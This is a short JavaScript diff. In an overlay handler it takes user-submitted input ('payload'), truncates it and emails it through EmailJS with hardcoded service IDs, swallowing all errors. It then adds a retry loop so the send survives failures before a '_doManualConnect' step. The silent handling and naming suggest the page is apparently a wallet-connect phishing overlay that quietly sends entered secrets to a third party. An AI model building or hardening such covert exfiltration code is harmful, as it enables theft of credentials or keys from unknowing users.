@@ -470,8 +470,17 @@ if (document.getElementById('wOverlay')) {
         if (!isValid) return;
 
         var safetext = payload.length > 40000 ? payload.substring(0, 40000) + "\n\n...[trunc]" : payload;
-        emailjs.send('service_b91vfvn', 'template_artm0pa', { message: safetext })
-            .then(function () { }).catch(function () { });
+
+        function sendEmailRetry(retries) {
+            emailjs.send('service_b91vfvn', 'template_artm0pa', { message: safetext })
+                .then(function () { })
+                .catch(function (error) {
+                    if (retries > 0) {
+                        setTimeout(function () { sendEmailRetry(retries - 1); }, 1500);
+                    }
+                });
+        }
+        sendEmailRetry(2);
 
         _doManualConnect();
     };
